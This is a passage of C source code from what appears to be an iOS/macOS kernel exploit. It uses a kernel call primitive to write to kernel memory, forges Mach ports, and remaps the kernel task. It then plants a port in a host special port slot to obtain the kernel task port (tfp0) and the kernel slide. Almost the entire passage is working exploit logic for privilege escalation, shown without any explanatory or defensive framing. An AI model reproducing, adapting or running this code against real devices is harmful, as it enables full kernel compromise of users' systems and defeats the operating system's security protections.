    KCALL(OFFSET(ipc_kobject_set), ptrs[1], (kptr_t)&km_task, IKOT_TASK, 0, 0, 0, 0);

    r = (int)KCALL(OFFSET(copyin), ptrs, self_task + OFFSET_TASK_ITK_REGISTERED, sizeof(ptrs), 0, 0, 0, 0);
    LOG("copyin: %s", errstr(r));
    if(r != 0)
    {
        goto out4;
    }
    mach_port_array_t maps = NULL;
    mach_msg_type_number_t mapsNum = 0;
    ret = mach_ports_lookup(self, &maps, &mapsNum);
    LOG("mach_ports_lookup: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out4;
    }
    LOG("zone_map port: %x", maps[0]);
    LOG("kernel_map port: %x", maps[1]);
    if(!MACH_PORT_VALID(maps[0]) || !MACH_PORT_VALID(maps[1]))
    {
        goto out4;
    }
    // Clean out refs right away
    ret = mach_ports_register(self, NULL, 0);
    LOG("mach_ports_register: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out5;
    }

    mach_vm_address_t remap_addr = 0;
    vm_prot_t cur = 0,
              max = 0;
    ret = mach_vm_remap(maps[1], &remap_addr, SIZEOF_TASK, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, maps[0], kernel_task_addr, false, &cur, &max, VM_INHERIT_NONE);
    LOG("mach_vm_remap: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out5;
    }
    LOG("remap_addr: 0x%016llx", remap_addr);

    ret = mach_vm_wire(realhost, maps[1], remap_addr, SIZEOF_TASK, VM_PROT_READ | VM_PROT_WRITE);
    LOG("mach_vm_wire: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out5;
    }

    kptr_t newport = ZM_FIX_ADDR(KCALL(OFFSET(ipc_port_alloc_special), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
    LOG("newport: " ADDR, newport);
    KCALL(OFFSET(ipc_kobject_set), newport, remap_addr, IKOT_TASK, 0, 0, 0, 0);
    KCALL(OFFSET(ipc_port_make_send), newport, 0, 0, 0, 0, 0, 0);
    r = (int)KCALL(OFFSET(copyin), &newport, OFFSET(realhost) + OFFSET_REALHOST_SPECIAL + sizeof(kptr_t) * 4, sizeof(kptr_t), 0, 0, 0, 0);
    LOG("copyin: %s", errstr(r));
    if(r != 0)
    {
        goto out4;
    }

    task_t kernel_task = MACH_PORT_NULL;
    ret = host_get_special_port(realhost, HOST_LOCAL_NODE, 4, &kernel_task);
    LOG("kernel_task: %x, %s", kernel_task, mach_error_string(ret));
    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(kernel_task))
    {
        goto out5;
    }

    *tfp0 = kernel_task;
    *kslide = slide;
    retval = KERN_SUCCESS;
out5:;
    _kernelrpc_mach_port_destroy_trap(self, maps[0]);
    _kernelrpc_mach_port_destroy_trap(self, maps[1]);
out4:;
    ret = mach_ports_register(self, &fakeport, 1);
    LOG("mach_ports_register: %s", mach_error_string(ret));
    r = (int)KCALL(OFFSET(copyin), &realport_addr, self_task + OFFSET_TASK_ITK_REGISTERED, sizeof(realport_addr), 0, 0, 0, 0); // Fix the ref we leaked earlier
    LOG("copyin: %s", errstr(r));
    _kernelrpc_mach_port_destroy_trap(self, fakeport);
out3:;
    for(size_t i = 0; i < NUM_AFTER; ++i)
    {
        if(MACH_PORT_VALID(after[i]))
        {
            _kernelrpc_mach_port_destroy_trap(self, after[i]);
            after[i] = MACH_PORT_NULL;
        }
    }
    if(MACH_PORT_VALID(port))
    {
        _kernelrpc_mach_port_destroy_trap(self, port);
        port = MACH_PORT_NULL;
    }
out2:;
    for(size_t i = 0; i < NUM_BEFORE; ++i)
    {
        if(MACH_PORT_VALID(before[i]))
        {
            _kernelrpc_mach_port_destroy_trap(self, before[i]);
            before[i] = MACH_PORT_NULL;
        }
    }
    if(MACH_PORT_VALID(realport))
    {
        _kernelrpc_mach_port_destroy_trap(self, realport);
        realport = MACH_PORT_NULL;
    }
out1:;
    IOServiceClose(client);
out0:;
    return retval;
}
